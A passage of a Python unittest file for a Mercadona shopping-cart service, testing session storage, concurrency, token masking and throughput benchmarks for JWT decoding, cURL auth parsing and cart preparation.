        self.assertFalse(res_fallback["live_synced"])
        self.assertEqual(res_fallback["status"], "cart_ready")
        self.assertIn("could not convert string to float", res_fallback["auth_error"])


class TestSessionManagementStressAndConcurrency(unittest.TestCase):
    """Concurrency, fuzzing, and disk failure resilience for Mercadona session management."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.orig_data_dir = mercadona_service.DATA_DIR
        self.orig_sessions_file = mercadona_service.SESSIONS_FILE
        self.orig_sessions_cache = dict(mercadona_service._MERCADONA_SESSIONS)

        mercadona_service.DATA_DIR = Path(self.temp_dir.name)
        mercadona_service.SESSIONS_FILE = mercadona_service.DATA_DIR / "mercadona_sessions.json"
        mercadona_service._MERCADONA_SESSIONS.clear()

    def tearDown(self):
        mercadona_service.DATA_DIR = self.orig_data_dir
        mercadona_service.SESSIONS_FILE = self.orig_sessions_file
        mercadona_service._MERCADONA_SESSIONS = self.orig_sessions_cache
        self.temp_dir.cleanup()

    def test_session_user_email_fuzzing_and_normalization(self):
        """Verifies session storage with case variations, whitespace, unicode, and long emails."""
        emails = [
            "USER@EXAMPLE.COM",
            "  user@example.com  ",
            "User.Name+tag@Sub.Domain.Co.Uk",
            "josé.garcía@mercadona.es",
            "a" * 1000 + "@example.com",
            None,
            "",
            "   ",
        ]
        for em in emails:
            session = {
                "access_token": "token_" + str(em),
                "customer_id": "cust_" + str(em),
            }
            # Save
            key = (em or "default").strip().lower() if em else "default"
            mercadona_service._MERCADONA_SESSIONS[key] = session
            # Retrieve
            retrieved = mercadona_service.get_active_mercadona_session(em)  # type: ignore[arg-type]
            self.assertIsNotNone(retrieved)
            self.assertEqual(retrieved["access_token"], session["access_token"])

    def test_session_disk_io_failure_resilience(self):
        """Verifies _save_sessions_to_disk does not crash when disk write raises OSError / PermissionError."""
        # Set file to a non-existent unwritable directory
        mercadona_service.SESSIONS_FILE = Path("/root/cannot_write/sessions.json")
        try:
            # Should not raise exception
            mercadona_service._save_sessions_to_disk()
        except Exception as exc:
            self.fail(f"_save_sessions_to_disk raised an unhandled exception: {exc}")

    def test_session_concurrent_multi_user_stress(self):
        """Stresses session CRUD with 20 concurrent threads."""
        def worker(user_id):
            email = f"user_{user_id}@test.com"
            sess = {
                "access_token": f"tok_{user_id}",
                "refresh_token": f"ref_{user_id}",
                "customer_id": f"cust_{user_id}",
                "warehouse": "mad3",
                "updated_at": int(time.time()),
            }
            # Write
            mercadona_service._MERCADONA_SESSIONS[email] = sess
            # Read
            status = mercadona_service.get_mercadona_session_status(email)
            assert status["connected"] is True
            # Clear
            mercadona_service.clear_mercadona_session(email)
            status_cleared = mercadona_service.get_mercadona_session_status(email)
            assert status_cleared["connected"] is False

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futs = [ex.submit(worker, i) for i in range(50)]
            for f in concurrent.futures.as_completed(futs):
                f.result()

    def test_session_token_masking_boundaries(self):
        """Verifies token masking logic on empty, short (< 20 chars), and long tokens."""
        # Short token (< 20 chars) -> returns 'Configurado'
        short_session = {"access_token": "short_token_123"}
        mercadona_service._MERCADONA_SESSIONS["short@test.com"] = short_session
        status_short = mercadona_service.get_mercadona_session_status("short@test.com")
        self.assertEqual(status_short["masked_token"], "Configurado")

        # Long token (> 20 chars) -> returns '{first 10}…{last 6}'
        long_tok = "1234567890abcdefghijklmnopqrstuvwxyz"
        long_session = {"access_token": long_tok}
        mercadona_service._MERCADONA_SESSIONS["long@test.com"] = long_session
        status_long = mercadona_service.get_mercadona_session_status("long@test.com")
        self.assertEqual(status_long["masked_token"], f"{long_tok[:10]}…{long_tok[-6:]}")


class TestSystemStressAndThroughputMetrics(unittest.TestCase):
    """Performance benchmarks and throughput metrics across core Mercadona operations."""

    @patch("urllib.request.urlopen")
    def test_throughput_postal_code_resolution(self, mock_urlopen):
        """Measures throughput of resolve_postal_code across 2,000 iterations."""
        mock_resp = MagicMock()
        mock_resp.headers = {"x-customer-wh": "mad3", "x-customer-pc": "28016"}
        mock_resp.__enter__.return_value = mock_resp
        mock_urlopen.return_value = mock_resp

        # Warmup cache
        mercadona_service.resolve_postal_code("28016")

        t0 = time.perf_counter()
        iterations = 2_000
        for i in range(iterations):
            mercadona_service.resolve_postal_code("28016")
        dt = time.perf_counter() - t0
        ops_sec = iterations / dt

        print(f"\n[METRIC] Postal Code Resolution: {ops_sec:,.0f} ops/sec (dt={dt:.4f}s for {iterations} ops)")
        self.assertGreater(ops_sec, 10_000, "Postal code cache throughput below expected threshold")

    def test_throughput_jwt_claims_decoding(self):
        """Measures throughput of _decode_jwt_claims across 2,000 iterations."""
        token = _make_jwt({"customer_uuid": "bench-user", "roles": ["buyer"]})

        t0 = time.perf_counter()
        iterations = 2_000
        for _ in range(iterations):
            mercadona_service._decode_jwt_claims(token)
        dt = time.perf_counter() - t0
        ops_sec = iterations / dt

        print(f"[METRIC] JWT Claims Decoding: {ops_sec:,.0f} ops/sec (dt={dt:.4f}s for {iterations} ops)")
        self.assertGreater(ops_sec, 5_000, "JWT decode throughput below expected threshold")

    def test_throughput_auth_input_parsing(self):
        """Measures throughput of parse_mercadona_auth_input on cURL inputs across 1,000 iterations."""
        tok = _make_jwt({"customer_uuid": "bench-curl-user"})
        curl_cmd = (
            f"curl 'https://tienda.mercadona.es/api/customers/bench-curl-user/cart/?lang=es&wh=mad3' "
            f"-H 'Authorization: Bearer {tok}' -H 'Cookie: s=123'"
        )

        t0 = time.perf_counter()
        iterations = 1_000
        for _ in range(iterations):
            mercadona_service.parse_mercadona_auth_input(curl_cmd)
        dt = time.perf_counter() - t0
        ops_sec = iterations / dt

        print(f"[METRIC] Auth Input cURL Parsing: {ops_sec:,.0f} ops/sec (dt={dt:.4f}s for {iterations} ops)")
        self.assertGreater(ops_sec, 2_000, "cURL parse throughput below expected threshold")

    @patch("mercadona_service.get_active_mercadona_session", return_value=None)
    @patch("urllib.request.urlopen")
    def test_throughput_cart_preparation(self, mock_urlopen, mock_session):
        """Measures throughput of prepare_mercadona_oneclick_cart across 500 iterations."""
        mock_resp = MagicMock()
        mock_resp.status = 200
        mock_resp.__enter__.return_value = mock_resp
        mock_urlopen.return_value = mock_resp

        basket = [
            {"id": "1", "name": "Item A", "quantity": 2, "unit": "ud", "unit_price": 1.50, "line_total": 3.00},
            {"id": "2", "name": "Item B", "quantity": 1, "unit": "kg", "unit_price": 4.20, "line_total": 4.20},
            {"id": "3", "name": "Item C", "quantity": 4, "unit": "l", "unit_price": 0.90, "line_total": 3.60},
        ]

        t0 = time.perf_counter()
        iterations = 500
        for _ in range(iterations):
            mercadona_service.prepare_mercadona_oneclick_cart(basket, postal_code="28016")
        dt = time.perf_counter() - t0
        ops_sec = iterations / dt

        print(f"[METRIC] Cart Preparation: {ops_sec:,.0f} ops/sec (dt={dt:.4f}s for {iterations} ops)")
        self.assertGreater(ops_sec, 1_000, "Cart preparation throughput below expected threshold")


if __name__ == "__main__":
    unittest.main()
